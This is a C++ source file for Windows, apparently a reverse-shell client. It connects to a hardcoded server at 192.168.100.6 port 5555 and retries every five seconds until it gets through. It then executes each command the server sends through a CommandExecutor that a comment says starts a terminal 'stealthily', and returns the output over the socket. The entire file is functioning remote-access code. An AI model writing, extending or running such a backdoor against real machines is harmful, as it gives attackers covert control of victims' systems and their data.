//#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <cstring>
#include "CommandExecutor.h"

using namespace std;

int main() {

	const wchar_t* SERVER_IP = L"192.168.100.6";
	const int SERVER_PORT = 5555;

	// Initialize Winsock dll
	WSADATA wsaData;
	int wsaerr;
	WORD wVersionRequested = MAKEWORD(2, 2);
	wsaerr = WSAStartup(wVersionRequested, &wsaData);

	if (wsaerr != 0) {
		cout << "The Winsock dll not found!" << endl;
		return 0;
	}
	else {
		cout << "The winsock dll found!" << endl;
		cout << "The status : " << wsaData.szSystemStatus << endl;
	}

	// Create socket to connect to the server
	SOCKET clientSocket = INVALID_SOCKET;
	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (clientSocket == INVALID_SOCKET) {
		cout << "Error at socket() : " << WSAGetLastError() << endl;
		WSACleanup();
		return 0;
	} else {
		cout << "socket() is OK!" << endl;
	}

	// Attempt to connect the socket to the server
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	InetPton(AF_INET, SERVER_IP, &clientService.sin_addr.s_addr);
	clientService.sin_port = htons(SERVER_PORT);

	// Will wait 75 seconds for server to respond.
	while (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) != 0) {
		cout << "Client: connect() failed to connect." << endl;
		Sleep(5000);
	}
	cout << "Client: connect() is OK." << endl;
	cout << "Client: Can start sending and receiving data…" << endl;

	char sendBuffer[4096] = "\n"; // Buffer to hold data to send to the server
	char receiveBuffer[200] = "\n"; // Buffer to hold commands received from the server
	int byteCount = 0;

	CommandExecutor cmdExecutor; // Initialize command executor and start the terminal stealthily

	while (true) {
		//RECEIVE DATA FROM SERVER
		byteCount = recv(clientSocket, receiveBuffer, 199, 0);
		if (byteCount <= 0) {
			printf("Client: recv failed or connection closed, error: %ld.\n", WSAGetLastError());
			break;
		}
		
		receiveBuffer[byteCount] = '\0';
		printf("Received data : %s \n", receiveBuffer);

		//SEND DATA TO SERVER (same as received message for now, will be replaced with command output)
		/*strcpy_s(sendBuffer, receiveBuffer);*/

		// Execute the command received from the server, and send the result back
		string result = cmdExecutor.executeCommand(receiveBuffer);
		strcpy_s(sendBuffer, sizeof(sendBuffer), result.c_str());
		byteCount = send(clientSocket, sendBuffer, strlen(sendBuffer), 0);
		if (byteCount == SOCKET_ERROR) {
			printf("Client: send failed, error %ld.\n", WSAGetLastError());
			break;
		}
		
		printf("Sent data : %s \n", sendBuffer);
	}
	


	closesocket(clientSocket);
	WSACleanup();
}